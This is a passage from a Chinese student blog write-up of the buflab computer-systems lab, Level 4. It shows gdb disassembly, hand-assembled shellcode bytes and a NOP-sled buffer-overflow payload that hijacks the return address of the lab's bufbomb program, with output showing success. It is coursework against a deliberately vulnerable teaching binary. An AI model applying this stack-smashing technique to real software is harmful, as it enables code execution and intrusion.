<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x08048cce &lt;+0&gt;:	push   %ebp</span><br><span class="line">0x08048ccf &lt;+1&gt;:	mov    %esp,%ebp</span><br><span class="line">0x08048cd1 &lt;+3&gt;:	push   %ebx</span><br><span class="line">0x08048cd2 &lt;+4&gt;:	sub    $0x24,%esp</span><br></pre></td></tr></table></figure>

<p>这个地方我是存有疑惑的，因为我觉得ebp应该是esp+24得到，但实际上是esp+28，不太明白是怎么回事，看网上其他人的博客，这里也一笔带过了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x0804924d &lt;+9&gt;:	lea    -0x208(%ebp),%eax</span><br></pre></td></tr></table></figure>

<p>这里可以知道缓冲区有520个字节加上ebp所占空间有524个字节，最后四个字节即return地址，填写buf缓冲区的地址</p>
<p>先搞攻击代码，和上一关类似，就ebp地址的获取方式不同</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov $0x685c1d96,%eax ;将cookie传入</span><br><span class="line">lea 0x28(%esp),%ebp	;获取ebp地址</span><br><span class="line">push $0x08048ce2 ;返回到test()函数</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>

<p>得到有效攻击代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">b8 96 1d 5c 68</span><br><span class="line">8d 6c 24 28</span><br><span class="line">68 e2 8c 04 08</span><br><span class="line">c3</span><br></pre></td></tr></table></figure>



<p>接下来是找最大的buf缓冲区首地址，这样即使每次buf缓冲区首地址不同也能够通过nop到达缓冲区末尾的攻击代码</p>
<p>断点设在0x08049253,查看eax即是buf首地址</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x0804924d &lt;+9&gt;:	lea    -0x208(%ebp),%eax</span><br><span class="line">0x08049253 &lt;+15&gt;:	mov    %eax,(%esp)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">(gdb) b *0x08049253</span><br><span class="line">Breakpoint 1 at 0x8049253</span><br><span class="line">(gdb) r -n -u 202026010521</span><br><span class="line">Starting program: /home/lkl/桌面/计算机系统/buflab-handout/bufbomb -n -u 202026010521</span><br><span class="line">Userid: 202026010521</span><br><span class="line">Cookie: 0x685c1d96</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x08049253 in getbufn ()</span><br><span class="line">(gdb) p/x $eax</span><br><span class="line">$1 = 0x55683668</span><br><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line">Type string: </span><br><span class="line">Dud: getbufn returned 0x1</span><br><span class="line">Better luck next time</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x08049253 in getbufn ()</span><br><span class="line">(gdb) p/x $eax</span><br><span class="line">$2 = 0x55683698</span><br><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line">Type string: </span><br><span class="line">Dud: getbufn returned 0x1</span><br><span class="line">Better luck next time</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x08049253 in getbufn ()</span><br><span class="line">(gdb) p/x $eax</span><br><span class="line">$3 = 0x55683678</span><br><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line">Type string: </span><br><span class="line">Dud: getbufn returned 0x1</span><br><span class="line">Better luck next time</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x08049253 in getbufn ()</span><br><span class="line">(gdb) p/x $eax</span><br><span class="line">$4 = 0x55683688</span><br><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line">Type string:                    </span><br><span class="line">Dud: getbufn returned 0x1</span><br><span class="line">Better luck next time</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x08049253 in getbufn ()</span><br><span class="line">(gdb) p/x $eax</span><br><span class="line">$5 = 0x55683688</span><br><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line">Type string: </span><br><span class="line">Dud: getbufn returned 0x1</span><br><span class="line">Better luck next time</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>得到5个地址</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$1 = 0x55683668</span><br><span class="line">$2 = 0x55683698</span><br><span class="line">$3 = 0x55683678</span><br><span class="line">$4 = 0x55683688</span><br><span class="line">$5 = 0x55683688</span><br></pre></td></tr></table></figure>

<p>将最大地址0x55683698作为目标地址即可</p>
<h4 id="答案及结果-2"><a href="#答案及结果-2" class="headerlink" title="答案及结果"></a>答案及结果</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">./4.txt</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 </span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 </span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 </span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 </span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 </span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 </span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 </span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 </span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 </span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 </span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 </span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 </span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 </span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 </span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 </span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 </span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 </span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 </span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 </span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 </span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 //509个字节</span><br><span class="line">b8 96 1d 5c 68</span><br><span class="line">8d 6c 24 28</span><br><span class="line">68 e2 8c 04 08</span><br><span class="line">c3 //攻击代码15个字节，共524个字节</span><br><span class="line">98 36 68 55 //buf目标地址</span><br><span class="line"></span><br><span class="line">lkl@lkl-virtual-machine:~/桌面/计算机系统/buflab-handout$ ./hex2raw -n &lt; 4.txt | ./bufbomb -n -u 202026010521</span><br><span class="line">Userid: 202026010521</span><br><span class="line">Cookie: 0x685c1d96</span><br><span class="line">Type string:KABOOM!: getbufn returned 0x685c1d96</span><br><span class="line">Keep going</span><br><span class="line">Type string:KABOOM!: getbufn returned 0x685c1d96</span><br><span class="line">Keep going</span><br><span class="line">Type string:KABOOM!: getbufn returned 0x685c1d96</span><br><span class="line">Keep going</span><br><span class="line">Type string:KABOOM!: getbufn returned 0x685c1d96</span><br><span class="line">Keep going</span><br><span class="line">Type string:KABOOM!: getbufn returned 0x685c1d96</span><br><span class="line">VALID</span><br><span class="line">NICE JOB!</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>完结撒花 _(:3」∠❀)__菊花碎了一地</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:869083577@qq.com">南懿烨曦</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://kallenblue.github.io/2022/09/08/buflab-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E5%AE%9E%E9%AA%8C/">https://kallenblue.github.io/2022/09/08/buflab-计算机系统实验/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://kallenblue.github.io" target="_blank">Code Play</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%B9%96%E5%8D%97%E5%A4%A7%E5%AD%A6/">湖南大学</a></div><div class="post_share"><div class="social-share" data-image="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-ceb77253-93f0-4559-a375-815102654932/e16e9047-7a60-48d9-91d5-f47d08752dd8.jpeg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i> 打赏</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-ceb77253-93f0-4559-a375-815102654932/fd2dd427-0dbb-475e-bde9-698997c1cce8.jpg" target="_blank"><img class="post-qr-code-img" src= "https://vkceyugu.cdn.bspapp.com/VKCEYUGU-ceb77253-93f0-4559-a375-815102654932/79aa9224-5aab-479d-86a1-de377b1b3f41.jpg" data-lazy-src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-ceb77253-93f0-4559-a375-815102654932/fd2dd427-0dbb-475e-bde9-698997c1cce8.jpg" alt="wechat"/></a><div class="post-qr-code-desc">wechat</div></li><li class="reward-item"><a href="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-ceb77253-93f0-4559-a375-815102654932/db4b8536-6225-4c68-bd78-1039d24093aa.jpg" target="_blank"><img class="post-qr-code-img" src= "https://vkceyugu.cdn.bspapp.com/VKCEYUGU-ceb77253-93f0-4559-a375-815102654932/79aa9224-5aab-479d-86a1-de377b1b3f41.jpg" data-lazy-src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-ceb77253-93f0-4559-a375-815102654932/db4b8536-6225-4c68-bd78-1039d24093aa.jpg" alt="alipay"/></a><div class="post-qr-code-desc">alipay</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2022/09/08/%E7%AE%80%E8%A6%81%E8%AE%B0%E5%BD%95%E4%B8%80%E4%B8%8Bhexo%E5%A4%84%E7%90%86%E5%8D%9A%E5%AE%A2%E7%9A%84%E6%93%8D%E4%BD%9C/"><img class="prev-cover" src= "https://vkceyugu.cdn.bspapp.com/VKCEYUGU-ceb77253-93f0-4559-a375-815102654932/79aa9224-5aab-479d-86a1-de377b1b3f41.jpg" data-lazy-src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-ceb77253-93f0-4559-a375-815102654932/e5fe83e9-aa1a-42ec-9859-94b2a3603535.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">简要记录一下hexo处理博客的操作</div></div></a></div><div class="next-post pull-right"><a href="/2022/09/08/%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2%E8%A7%A3%E5%86%B3%E5%B8%B8%E8%A7%81%E7%9A%84%E6%8E%92%E5%BA%8F/"><img class="next-cover" src= "https://vkceyugu.cdn.bspapp.com/VKCEYUGU-ceb77253-93f0-4559-a375-815102654932/79aa9224-5aab-479d-86a1-de377b1b3f41.jpg" data-lazy-src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-ceb77253-93f0-4559-a375-815102654932/da163394-3144-433c-8192-d8f0cf9c3fb3.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">一篇博客解决常见的排序</div></div></a></div></nav><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div><div id="comment-switch"><span class="first-comment">Livere</span><span class="switch-btn"></span><span class="second-comment">Disqus</span></div></div><div class="comment-wrap"><div><div id="lv-container" data-id="city" data-uid="MTAyMC81NzI0MS8zMzcwNQ=="></div></div><div><div id="disqus_thread"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0-%E6%9F%A5%E7%9C%8Bcookie"><span class="toc-number">1.</span> <span class="toc-text">0. 查看cookie</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#1-Level0-Candle-10-pts"><span class="toc-number">2.</span> <span class="toc-text">1.Level0: Candle (10 pts)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF"><span class="toc-number">2.0.1.</span> <span class="toc-text">解题思路</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%AD%94%E6%A1%88%E5%8F%8A%E7%BB%93%E6%9E%9C"><span class="toc-number">2.0.1.0.1.</span> <span class="toc-text">答案及结果</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2-Level1-Sparkler-10-pts"><span class="toc-number">3.</span> <span class="toc-text">2.Level1: Sparkler (10 pts)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF-1"><span class="toc-number">3.0.0.1.</span> <span class="toc-text">解题思路</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#3-Level2-Firecracker-15-pts"><span class="toc-number">4.</span> <span class="toc-text">3.Level2: Firecracker (15 pts)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF-2"><span class="toc-number">4.0.0.1.</span> <span class="toc-text">解题思路</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E6%9B%B4%E6%94%B9global-val%E7%9A%84%E5%80%BC%E4%B8%BAcookie"><span class="toc-number">4.0.0.1.1.</span> <span class="toc-text">1.更改global_val的值为cookie</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E5%B0%86bang-%E5%87%BD%E6%95%B0%E7%9A%84%E5%9C%B0%E5%9D%80%E4%BD%9C%E4%B8%BA%E8%BF%94%E5%9B%9E%E5%9C%B0%E5%9D%80%E5%8E%8B%E6%A0%88"><span class="toc-number">4.0.0.1.2.</span> <span class="toc-text">2.将bang()函数的地址作为返回地址压栈</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%AD%94%E6%A1%88%E5%8F%8A%E7%BB%93%E6%9E%9C-1"><span class="toc-number">4.0.0.1.3.</span> <span class="toc-text">答案及结果</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#4-Level-3-Dynamite-20-pts"><span class="toc-number">5.</span> <span class="toc-text">4.Level 3: Dynamite (20 pts)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link"><span class="toc-number">5.0.0.1.</span> <span class="toc-text"></span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF-3"><span class="toc-number">5.0.0.2.</span> <span class="toc-text">解题思路</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#5-Level4-Nitroglycerin-10-pts"><span class="toc-number">6.</span> <span class="toc-text">5.Level4: Nitroglycerin (10 pts)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF-4"><span class="toc-number">6.0.0.1.</span> <span class="toc-text">解题思路</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AD%94%E6%A1%88%E5%8F%8A%E7%BB%93%E6%9E%9C-2"><span class="toc-number">6.0.0.2.</span> <span class="toc-text">答案及结果</span></a></li></ol></li></ol></li></ol></li></ol></div></div></div></div></main><footer id="footer" style="background-image: url('/image/footer-bg.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2022 By 南懿烨曦</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">wow~你居然翻到了页底~恭喜你发现宝藏🎁</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">简</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="chat_btn" type="button" title="聊天"><i class="fas fa-sms"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/medium-zoom/dist/medium-zoom.min.js"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><div class="js-pjax"><script>function loadLivere () {
  if (typeof LivereTower === 'object') {
    window.LivereTower.init()
  }
  else {
    (function(d, s) {
        var j, e = d.getElementsByTagName(s)[0];
        if (typeof LivereTower === 'function') { return; }
        j = d.createElement(s);
        j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
        j.async = true;
        e.parentNode.insertBefore(j, e);
    })(document, 'script');
  }
}

if ('Livere' === 'Livere' || !false) {
  if (false) btf.loadComment(document.getElementById('lv-container'), loadLivere)
  else loadLivere()
}
else {
  function loadOtherComment () {
    loadLivere()
  }
}</script><script>function loadDisqus () {
  var disqus_config = function () {
    this.page.url = 'https://kallenblue.github.io/2022/09/08/buflab-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E5%AE%9E%E9%AA%8C/'
    this.page.identifier = '2022/09/08/buflab-计算机系统实验/'
    this.page.title = 'buflab-计算机系统实验'
  };

  window.disqusReset = () => {
    DISQUS.reset({
      reload: true,
      config: disqus_config
    })
  }

  if (window.DISQUS) disqusReset()
  else {
    (function() { 
      var d = document, s = d.createElement('script');
      s.src = 'https://httpskallenbluegithubio.disqus.com/embed.js';
      s.setAttribute('data-timestamp', +new Date());
      (d.head || d.body).appendChild(s);
    })();
  }
}

if ('Livere' === 'Disqus' || !false) {
  if (false) btf.loadComment(document.getElementById('disqus_thread'), loadDisqus)
  else loadDisqus()
} else {
  function loadOtherComment () {
    loadDisqus()
  }
}
</script></div><script defer="defer" id="fluttering_ribbon" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-fluttering-ribbon.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
POWERMODE.shake = false;
POWERMODE.mobile = false;
document.body.addEventListener('input', POWERMODE);
</script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/click-show-text.min.js" data-mobile="false" data-text="Hiraeth,Ephemeral,Limerence,Sonorous,Aurora,Epoch,Epiphany,Petrichor" data-fontsize="15px" data-random="true" async="async"></script><script src="//code.tidio.co/lvwsl5yorrlxergsbml1bxzfxmcqmojl.js" async="async"></script><script>function onTidioChatApiReady() {
  window.tidioChatApi.hide();
  window.tidioChatApi.on("close", function() {
    window.tidioChatApi.hide();
  });
}
if (window.tidioChatApi) {
  window.tidioChatApi.on("ready", onTidioChatApiReady);
} else {
  document.addEventListener("tidioChat-ready", onTidioChatApiReady);
}

var chatBtnFn = () => {
  document.getElementById("chat_btn").addEventListener("click", function(){
    window.tidioChatApi.show();
    window.tidioChatApi.open();
  });
}
chatBtnFn()
</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>